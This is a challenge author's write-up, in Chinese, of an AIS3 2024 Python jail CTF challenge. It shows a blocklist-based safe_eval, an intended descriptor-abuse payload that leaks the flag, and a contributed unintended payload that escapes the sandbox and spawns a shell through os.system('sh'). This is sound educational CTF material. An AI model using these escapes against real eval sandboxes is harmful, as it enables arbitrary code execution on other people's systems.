# AIS3 preexam 2024

這次在 AIS3 preexam 只有出一題，主要用的艮是之前在研究 cPython 時發現的一個有趣特性，希望大家會喜歡 ouo

## Can you describe Pyjail?

solve: 2/321

TL;DR;
1. 發現 [python descriptor 優先度性質](https://blog.vincent55.tw/posts/python_descriptor/)
2. 找到 setattr
3. 將 descriptor 加上 `__set__` 屬性，結束！

```python!
class Desc:
    """
    Welcome to my 🐍 ⛓️
    """

    def __get__(self, objname, obj):
        return __import__("conf").flag

    def desc_helper(self, name):
        origin = getattr(type, name)
        if origin == type.__getattribute__:
            raise NameError(
                "Access to forbidden name %r (%r)" % (name, "__getattribute__")
            )
        self.helper = origin


class Test:
    desc = Desc()
    
test = Test()
test.desc = "flag{fakeflag}"

# Just a tricky way to print a welcome message, or maybe a hint :/
# You can just `print(getdoc(Desc))`
# This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.
welcome_msg = """
desctmp := Desc()
desctmp.desc_helper("__base__")
Obj := desctmp.helper
desctmp := Desc()
desctmp.desc_helper("__subclasses__")
print(getdoc(desctmp.helper(Obj)[-2]))
""".strip().replace("\n", ",")
welcome_msg = f"({welcome_msg})"

safe_eval(
    welcome_msg,
    {"__builtins__": {}},
    {"Desc": Desc, "print": print, "getdoc": getdoc},
)


# Your challenge begin here!
payload = input("✏️: ")

safe_eval(
    payload,
    {"__builtins__": {}},
    {"Desc": Desc},
)

# print(f"test.__dict__: {test.__dict__}")
print(f"🚩: {test.desc}")

```

這題先是定義了一個 Descriptor 將 flag 放到 `__get__` 中，並且讓 Test 使用這個 Descriptor，實例化之後將假 flag 放到 test 的 `__dict__` 中，導致最後在 `print(f"🚩: {test.desc}")` 時只會印出假的 flag。

這題的預期解是往 descriptor 的類別上加入 `__set__` 屬性，透過 descriptor 的特性（詳見 [深入解析 Python descriptor 與其 opcode 處理](https://blog.vincent55.tw/posts/python_descriptor/)），讓在 `GETATTR` 時優先使用 `__get__`，如此一來最後就會將 flag 印出來。

那接下來的問題就回到我們該如何往類別上加入屬性呢，我們有一次的 safe_eval 控制機會，並且可以發現他將 `Desc` 也放進 context 了，沒錯，我們要在 `Desc` 中找 gadget。

```python!
from types import CodeType

_UNSAFE_ATTRIBUTES = [
    "f_builtins",
    "f_globals",
    "f_locals",
    "gi_frame",
    "gi_code",
    "co_code",
    "func_globals",
    "format",
    "format_map",
]


def test_no_dunder_name(code_obj, expr):
    for name in code_obj.co_names:
        if "__" in name or name in _UNSAFE_ATTRIBUTES:
            raise NameError("Access to forbidden name %r (%r)" % (name, expr))


def test_codeobj(code_obj, expr):
    test_no_dunder_name(code_obj, expr)
    for const in code_obj.co_consts:
        if isinstance(const, CodeType):
            test_codeobj(const, expr)


def test_expr(expr):
    code_obj = compile(expr, "", "eval")
    test_no_dunder_name(code_obj, expr)
    test_codeobj(code_obj, expr)
    return code_obj


def safe_eval(expr, globals_dict, locals_dict):
    c = test_expr(expr)
    return eval(c, globals_dict, locals_dict)
```

可以看到在這個 `safe_eval.py` 中會遞迴的在 `code object` 中看 `co_names` 是否有存在 `__`，也就是說我們不能直接用 dunder method。

```python!
class Desc:
    """
    Welcome to my 🐍 ⛓️
    """

    def __get__(self, objname, obj):
        return __import__("conf").flag

    def desc_helper(self, name):
        origin = getattr(type, name)
        if origin == type.__getattribute__:
            raise NameError(
                "Access to forbidden name %r (%r)" % (name, "__getattribute__")
            )
        self.helper = origin
```

回來看到 `Desc` 當中有定義了 `desc_helper` ，裡面有 getattr 可以使用，由於我們的目的是拿到 setattr 之類的東西，在 `type` 中找一下就會發現我們可以使用 `type.__setattr__`！

於是我們最終的 payload 就長這樣:
```python!
payload = """
desctmp := Desc()
desctmp.desc_helper("__setattr__")
Setattr := desctmp.helper
Setattr(Desc, "__set__", 1)
""".strip().replace("\n", ",")
payload = f"({payload})"
print(payload)
```

這題 @maple3142 有找到一個非預期解，主要是在 `desc_helper` 過程中雖然有檢查不能回傳 `type.__getattribute__`，但如果是回傳 `type.__dict__` 之後再透過 `a['__getattribute__']` 就可以拿到 getattr 了。
這樣不會被 safe_eval 擋下來的原因是 `a['__getattribute__']`  這種操作的 dunder strings 是在 `co_consts` 不是在 `co_name`，有了 getattr 後就能直接 getshell 了，不用管 descriptor 的性質。

maple 的 payload:
```python!
(d:=Desc(),d.desc_helper('__dict__'),ga:=d.helper['__getattribute__'],d.desc_helper('__base__'),object:=d.helper,gao:=ga(object,'__getattribute__'),newobj:=gao([],'__reduce_ex__')(3)[0]),gao(newobj,'__builtins__')['__import__']('os').system('sh')
```
 
